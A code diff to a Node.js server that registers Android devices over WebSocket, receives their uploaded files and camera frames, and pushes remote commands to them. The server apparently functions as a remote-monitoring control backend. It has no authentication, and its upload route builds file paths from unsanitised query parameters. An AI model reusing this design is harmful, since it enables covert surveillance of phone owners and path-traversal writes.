@@ -7,7 +7,7 @@ const WebSocket = require('ws');
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
-const port = 8080;
+const port = process.env.PORT || 8080;
 
 // Ensure uploads directory exists
 const uploadDir = path.join(__dirname, 'uploads');
@@ -22,13 +22,21 @@ app.use(express.static(__dirname));
 let deviceStatuses = {};
 let deviceResponses = {};
 let connectedDevices = {}; // deviceId -> ws connection
-let lastFrame = null;
+let deviceFrames = {};    // deviceId -> buffer
 
 // --- WebSocket Logic ---
 wss.on('connection', (ws, req) => {
     let currentDeviceId = 'unknown';
 
     ws.on('message', (message) => {
+        // FAST PATH: Binary data is treated as camera frame
+        if (typeof message !== 'string') {
+            if (currentDeviceId !== 'unknown') {
+                deviceFrames[currentDeviceId] = message;
+            }
+            return;
+        }
+
         try {
             const data = JSON.parse(message);
             if (data.type === 'register') {
@@ -36,7 +44,12 @@ wss.on('connection', (ws, req) => {
                 connectedDevices[currentDeviceId] = ws;
                 console.log(`🔌 Device Registered via WS: ${currentDeviceId}`);
             }
-        } catch (e) { console.error("WS Message Error", e); }
+        } catch (e) {
+            // If not JSON, it might be raw binary in some environments
+            if (currentDeviceId !== 'unknown') {
+                deviceFrames[currentDeviceId] = message;
+            }
+        }
     });
 
     ws.on('close', () => {
@@ -49,7 +62,6 @@ wss.on('connection', (ws, req) => {
 
 // --- Android App Endpoints ---
 
-// Still keeping this for backward compatibility or initial registration
 app.post('/post-status', (req, res) => {
     const deviceId = req.body.deviceId || req.query.deviceId || 'unknown';
     deviceStatuses[deviceId] = {
@@ -71,13 +83,14 @@ app.post('/upload-file', express.raw({ type: 'application/octet-stream', limit: 
     const { fileName, deviceId } = req.query;
     const filePath = path.join(uploadDir, `${deviceId || 'unknown'}_${fileName || Date.now()}`);
     fs.writeFile(filePath, req.body, (err) => {
-        if (err) return res.status(500).send("Error");
+        if (err) return res.status(500).send("Error saving file");
         res.json({ status: "ok" });
     });
 });
 
 app.post('/post-frame', express.raw({ type: 'image/jpeg', limit: '10mb' }), (req, res) => {
-    lastFrame = req.body;
+    const deviceId = req.query.deviceId || 'unknown';
+    deviceFrames[deviceId] = req.body;
     res.status(200).send();
 });
 
@@ -96,10 +109,9 @@ app.post('/send-command', (req, res) => {
     const ws = connectedDevices[deviceId];
     if (ws && ws.readyState === WebSocket.OPEN) {
         ws.send(JSON.stringify(command));
-        console.log(`🚀 Command sent INSTANTLY to ${deviceId}: ${action}`);
+        console.log(`🚀 Command sent to ${deviceId}: ${action}`);
         res.json({ status: "Sent", deviceId });
     } else {
-        console.log(`⚠️ Device ${deviceId} not connected via WS. Command discarded.`);
         res.status(404).json({ error: "Device not online" });
     }
 });
@@ -115,14 +127,18 @@ app.get('/get-device-data', (req, res) => {
 });
 
 app.get('/live-frame', (req, res) => {
-    if (lastFrame) {
+    const deviceId = req.query.deviceId;
+    const frame = deviceFrames[deviceId];
+    if (frame) {
         res.set('Content-Type', 'image/jpeg');
-        res.send(lastFrame);
-    } else res.status(404).send();
+        res.send(frame);
+    } else {
+        res.status(404).send("No frame");
+    }
 });
 
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
 server.listen(port, '0.0.0.0', () => {
-    console.log(`\n🚀 Real-time Server running at http://localhost:${port}\n`);
+    console.log(`\n🚀 Real-time Server running on port ${port}\n`);
 });
